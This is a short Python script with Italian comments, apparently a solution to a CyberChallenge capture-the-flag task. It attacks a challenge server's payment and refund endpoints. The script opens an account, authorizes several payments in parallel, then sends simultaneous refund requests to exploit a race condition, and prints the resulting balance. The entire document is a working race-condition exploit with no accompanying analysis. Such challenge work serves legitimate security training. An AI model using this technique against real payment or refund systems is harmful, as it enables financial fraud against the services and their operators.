import requests
import concurrent.futures

# URL del server
base_url = "http://evilcorp.challs.cyberchallenge.it/"

# Creazione della sessione per mantenere i cookie
session = requests.Session()

# 1️⃣ Creiamo un account e resettiamo i pagamenti
print("[+] Creazione account...")
session.get(base_url + "new_account.php")

# 2️⃣ Funzione per autorizzare un pagamento
def authorize_payment(amount):
    url = f"{base_url}authorize_payment.php?amount={amount}"
    return session.get(url)

# 3️⃣ Funzione per rimborsare un pagamento
def refund_payment(payment_id):
    url = f"{base_url}refund_payment.php?id={payment_id}"
    return session.get(url)

# 4️⃣ Creiamo più pagamenti e li rimborsiamo in parallelo
with concurrent.futures.ThreadPoolExecutor() as executor:
    futures = []
    
    # Autorizziamo più pagamenti in parallelo
    print("[+] Autorizzando pagamenti simultanei...")
    for _ in range(3):  # Creiamo più pagamenti da 100
        futures.append(executor.submit(authorize_payment, 100))
    
    # Aspettiamo che le autorizzazioni siano completate
    concurrent.futures.wait(futures)

    # Ora proviamo a rimborsare tutto in parallelo
    print("[+] Richiedendo refund simultanei...")
    futures = [executor.submit(refund_payment, i) for i in range(3)]
    
    # Aspettiamo il completamento dei refund
    concurrent.futures.wait(futures)

# 5️⃣ Controlliamo il saldo finale
print("[+] Controllo saldo...")
home = session.get(base_url + "index.php")
print(home.text)  # Stampiamo il contenuto della pagina per vedere il risultato
